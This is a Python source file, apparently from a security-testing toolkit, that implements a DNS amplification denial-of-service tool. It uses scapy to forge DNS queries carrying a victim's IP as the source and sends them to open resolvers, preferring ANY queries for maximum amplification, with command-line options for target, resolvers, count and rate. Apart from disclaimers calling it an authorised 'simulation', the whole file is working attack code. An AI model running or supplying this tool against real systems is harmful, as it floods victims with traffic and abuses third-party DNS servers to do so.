#!/usr/bin/env python3
"""
DNS Amplification Attack Simulation

This module provides a class-based implementation for simulating DNS amplification attacks,
a type of Distributed Denial of Service (DDoS) attack that exploits open DNS resolvers to
overwhelm a target with amplified DNS response traffic.

The module supports various features:
- Customizable DNS query types for different amplification factors
- Rate limiting to control traffic generation
- Spoofed source IP address (the victim's address)
- Detailed logging and statistics
- Multiple DNS server targeting

IMPORTANT ETHICAL AND LEGAL NOTICE:
This tool should ONLY be used for legitimate security testing with proper authorization.
Unauthorized use against systems without explicit permission is illegal and unethical.
The authors assume no liability for misuse of this software.

Usage Examples:
    # Basic usage with command line arguments
    python dns_amplification.py -t 192.168.1.10 -s 8.8.8.8 -d example.com
    
    # Specify multiple DNS servers
    python dns_amplification.py -t 192.168.1.10 -s 8.8.8.8,8.8.4.4 -d example.com
    
    # Use with specific query type and count
    python dns_amplification.py -t 192.168.1.10 -s 8.8.8.8 -d example.com -q ANY -c 10

Author: Montimage
License: Proprietary
Version: 1.0.0
"""

import os
import sys
import time
import random
import socket
import argparse
import ipaddress
from typing import List, Dict, Optional, Any, Tuple, Union

# Add parent directory to path to import logger
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
try:
    from logger import get_logger
except ImportError:
    # Fallback logging if the centralized logger is not available
    import logging
    def get_logger(name):
        logger = logging.getLogger(name)
        if not logger.handlers:
            handler = logging.StreamHandler()
            formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
            handler.setFormatter(formatter)
            logger.addHandler(handler)
            logger.setLevel(logging.INFO)
        return logger

# Get logger for this module
logger = get_logger(__name__)

# Import scapy with error handling
try:
    from scapy.all import IP, UDP, DNS, DNSQR, send, conf
except ImportError:
    logger.error("This script requires the scapy library.")
    logger.error("Install it using: pip install scapy")
    sys.exit(1)

# Suppress scapy warnings
conf.verb = 0


class DNSAmplificationAttack:
    """
    A class to perform DNS amplification attack simulations for security testing.
    
    This class provides methods to generate and send spoofed DNS queries to open
    DNS resolvers, with the source IP set to the victim's address, causing the
    DNS servers to send amplified responses to the victim.
    
    Attributes:
        target_ip (str): IP address of the target (victim)
        dns_servers (List[str]): List of DNS server IP addresses to use
        domain (str): Domain name to query
        query_type (str): Type of DNS query (e.g., ANY, TXT, etc.)
        query_count (int): Number of queries to send
        interval (float): Time interval between queries in seconds
        verbose (bool): Whether to enable verbose output
    """
    
    # DNS query types and their typical amplification factors
    QUERY_TYPES = {
        'A': 2,           # Address record, low amplification
        'AAAA': 2,        # IPv6 address record, low amplification
        'TXT': 10,        # Text record, medium amplification
        'MX': 4,          # Mail exchange record, low-medium amplification
        'NS': 3,          # Name server record, low amplification
        'SOA': 3,         # Start of authority record, low amplification
        'CNAME': 3,       # Canonical name record, low amplification
        'ANY': 50,        # Any record, very high amplification
        'SRV': 6,         # Service record, medium amplification
    }
    
    # Default DNS port
    DNS_PORT = 53
    
    def __init__(self, 
                 target_ip: str, 
                 dns_servers: List[str],
                 domain: str,
                 query_type: str = 'ANY',
                 query_count: int = 5,
                 interval: float = 0.5,
                 verbose: bool = False):
        """
        Initialize the DNS amplification attack simulator.
        
        Args:
            target_ip (str): IP address of the target (victim)
            dns_servers (List[str]): List of DNS server IP addresses to use
            domain (str): Domain name to query
            query_type (str, optional): Type of DNS query. Defaults to 'ANY'.
            query_count (int, optional): Number of queries to send. Defaults to 5.
            interval (float, optional): Time interval between queries in seconds. Defaults to 0.5.
            verbose (bool, optional): Whether to enable verbose output. Defaults to False.
            
        Raises:
            ValueError: If target_ip is not a valid IP address
            ValueError: If any DNS server IP is not valid
            ValueError: If query_type is not supported
        """
        # Validate target IP
        try:
            ipaddress.ip_address(target_ip)
            self.target_ip = target_ip
        except ValueError:
            raise ValueError(f"Invalid target IP address: {target_ip}")
        
        # Validate DNS server IPs
        self.dns_servers = []
        for server in dns_servers:
            try:
                ipaddress.ip_address(server)
                self.dns_servers.append(server)
            except ValueError:
                logger.warning(f"Invalid DNS server IP address: {server}, skipping")
        
        if not self.dns_servers:
            raise ValueError("No valid DNS server IP addresses provided")
        
        # Validate query type
        query_type = query_type.upper()
        if query_type not in self.QUERY_TYPES:
            raise ValueError(f"Unsupported query type: {query_type}. Supported types: {', '.join(self.QUERY_TYPES.keys())}")
        self.query_type = query_type
        
        # Set other parameters
        self.domain = domain
        self.query_count = max(1, query_count)  # Ensure at least 1 query
        self.interval = max(0.1, interval)  # Ensure reasonable interval
        self.verbose = verbose
        
        # Initialize state variables
        self.packets_sent = 0
        self.start_time = None
        self.end_time = None
        
        # Set scapy verbosity
        conf.verb = 1 if verbose else 0
        
        # Calculate estimated amplification factor
        self.amplification_factor = self.QUERY_TYPES.get(query_type, 1)
        
        logger.info(f"Initialized DNS amplification attack simulation")
        logger.info(f"Target: {target_ip}, Domain: {domain}, Query type: {query_type}")
        logger.info(f"Using {len(self.dns_servers)} DNS servers")
        if self.verbose:
            logger.info(f"Estimated amplification factor: {self.amplification_factor}x")
            logger.info(f"Query count: {query_count}, Interval: {interval}s")
    
    def create_dns_query(self, dns_server: str) -> IP:
        """
        Create a spoofed DNS query packet.
        
        Args:
            dns_server (str): DNS server IP address
            
        Returns:
            IP: The constructed IP packet with DNS query
        """
        # Create random transaction ID
        dns_id = random.randint(0, 65535)
        
        # Create the packet layers
        ip_layer = IP(dst=dns_server, src=self.target_ip)
        udp_layer = UDP(dport=self.DNS_PORT, sport=random.randint(1024, 65535))
        dns_layer = DNS(
            id=dns_id,
            qd=DNSQR(qname=self.domain, qtype=self.query_type)
        )
        
        # Combine layers
        packet = ip_layer/udp_layer/dns_layer
        
        if self.verbose:
            logger.debug(f"Created DNS query packet: {self.domain} {self.query_type} -> {dns_server}")
        
        return packet
    
    def send_query(self, dns_server: str) -> bool:
        """
        Send a spoofed DNS query to a DNS server.
        
        Args:
            dns_server (str): DNS server IP address
            
        Returns:
            bool: True if packet sent successfully, False otherwise
        """
        try:
            # Create and send packet
            packet = self.create_dns_query(dns_server)
            send(packet, verbose=0)
            self.packets_sent += 1
            
            if self.verbose:
                logger.debug(f"Sent DNS query to {dns_server}")
                
            return True
            
        except Exception as e:
            logger.error(f"Error sending DNS query to {dns_server}: {str(e)}")
            return False
    
    def execute(self) -> Dict[str, Any]:
        """
        Execute the DNS amplification attack.
        
        Returns:
            Dict[str, Any]: Statistics about the attack execution
        """
        logger.info(f"Starting DNS amplification attack against {self.target_ip}")
        logger.info(f"Sending {self.query_count} queries of type {self.query_type} for domain {self.domain}")
        
        self.start_time = time.time()
        self.packets_sent = 0
        
        try:
            for i in range(1, self.query_count + 1):
                logger.info(f"Sending query {i}/{self.query_count}")
                
                # Send a query to each DNS server
                for dns_server in self.dns_servers:
                    self.send_query(dns_server)
                
                # Wait before sending next queries (if not the last one)
                if i < self.query_count and self.interval > 0:
                    if self.verbose:
                        logger.debug(f"Waiting {self.interval} seconds before next query")
                    time.sleep(self.interval)
            
            logger.info("DNS amplification attack completed successfully")
            
        except KeyboardInterrupt:
            logger.warning("Attack interrupted by user")
        except Exception as e:
            logger.error(f"Error during attack: {str(e)}")
        finally:
            self.end_time = time.time()
            stats = self._get_statistics()
            self._print_summary(stats)
            return stats
    
    def _get_statistics(self) -> Dict[str, Any]:
        """
        Get statistics about the attack execution.
        
        Returns:
            Dict[str, Any]: Statistics including packets sent, estimated traffic, etc.
        """
        end_time = self.end_time or time.time()
        start_time = self.start_time or end_time
        duration = end_time - start_time
        
        # Estimate query and response sizes (very rough estimates)
        avg_query_size = 60  # bytes
        avg_response_size = avg_query_size * self.amplification_factor
        
        # Calculate traffic estimates
        query_traffic = self.packets_sent * avg_query_size
        estimated_response_traffic = self.packets_sent * avg_response_size
        
        return {
            "target_ip": self.target_ip,
            "domain": self.domain,
            "query_type": self.query_type,
            "dns_servers_used": len(self.dns_servers),
            "packets_sent": self.packets_sent,
            "duration_seconds": duration,
            "packets_per_second": self.packets_sent / duration if duration > 0 else 0,
            "amplification_factor": self.amplification_factor,
            "query_traffic_bytes": query_traffic,
            "estimated_response_traffic_bytes": estimated_response_traffic,
            "traffic_amplification": f"{self.amplification_factor}x"
        }
    
    def _print_summary(self, stats: Dict[str, Any]) -> None:
        """
        Print a summary of the attack execution.
        
        Args:
            stats (Dict[str, Any]): Statistics from _get_statistics()
        """
        logger.info("=" * 50)
        logger.info("DNS Amplification Attack Summary")
        logger.info("=" * 50)
        logger.info(f"Target: {stats['target_ip']}")
        logger.info(f"Domain queried: {stats['domain']}")
        logger.info(f"Query type: {stats['query_type']}")
        logger.info(f"DNS servers used: {stats['dns_servers_used']}")
        logger.info(f"Packets sent: {stats['packets_sent']}")
        logger.info(f"Duration: {stats['duration_seconds']:.2f} seconds")
        logger.info(f"Rate: {stats['packets_per_second']:.2f} packets/second")
        logger.info(f"Amplification factor: {stats['amplification_factor']}x")
        logger.info(f"Query traffic: {stats['query_traffic_bytes']/1024:.2f} KB")
        logger.info(f"Estimated response traffic: {stats['estimated_response_traffic_bytes']/1024:.2f} KB")
        logger.info("=" * 50)


def parse_arguments() -> argparse.Namespace:
    """
    Parse command-line arguments for the DNS amplification attack.
    
    Returns:
        argparse.Namespace: The parsed command-line arguments
    """
    parser = argparse.ArgumentParser(
        description="DNS Amplification Attack Simulation Tool",
        epilog="IMPORTANT: Use only for authorized security testing."
    )
    
    # Required arguments
    parser.add_argument(
        "-t", "--target",
        dest="target_ip",
        required=True,
        help="IP address of the target (victim)"
    )
    
    parser.add_argument(
        "-s", "--servers",
        dest="dns_servers",
        required=True,
        help="Comma-separated list of DNS server IP addresses"
    )
    
    parser.add_argument(
        "-d", "--domain",
        dest="domain",
        required=True,
        help="Domain name to query"
    )
    
    # Optional arguments
    parser.add_argument(
        "-q", "--query-type",
        dest="query_type",
        default="ANY",
        choices=DNSAmplificationAttack.QUERY_TYPES.keys(),
        help="Type of DNS query (default: ANY)"
    )
    
    parser.add_argument(
        "-c", "--count",
        dest="query_count",
        type=int,
        default=5,
        help="Number of queries to send (default: 5)"
    )
    
    parser.add_argument(
        "-i", "--interval",
        dest="interval",
        type=float,
        default=0.5,
        help="Time interval between queries in seconds (default: 0.5)"
    )
    
    parser.add_argument(
        "-v", "--verbose",
        dest="verbose",
        action="store_true",
        help="Enable verbose output"
    )
    
    return parser.parse_args()


def main() -> None:
    """
    Main entry point for the DNS amplification attack simulation.
    """
    # Display ethical notice
    print("=" * 80)
    print("WARNING: This tool is for AUTHORIZED SECURITY TESTING ONLY")
    print("Using this tool against systems without permission is ILLEGAL")
    print("The authors assume NO LIABILITY for misuse of this software")
    print("=" * 80)
    print()
    
    try:
        # Parse command-line arguments
        args = parse_arguments()
        
        # Parse DNS servers list
        dns_servers = [server.strip() for server in args.dns_servers.split(',') if server.strip()]
        
        # Create and execute the attack
        attack = DNSAmplificationAttack(
            target_ip=args.target_ip,
            dns_servers=dns_servers,
            domain=args.domain,
            query_type=args.query_type,
            query_count=args.query_count,
            interval=args.interval,
            verbose=args.verbose
        )
        
        # Execute the attack
        attack.execute()
        
    except KeyboardInterrupt:
        print("\nAttack simulation interrupted by user")
        sys.exit(0)
        
    except Exception as e:
        logger.error(f"Unhandled error: {str(e)}")
        sys.exit(1)


if __name__ == "__main__":
    main()
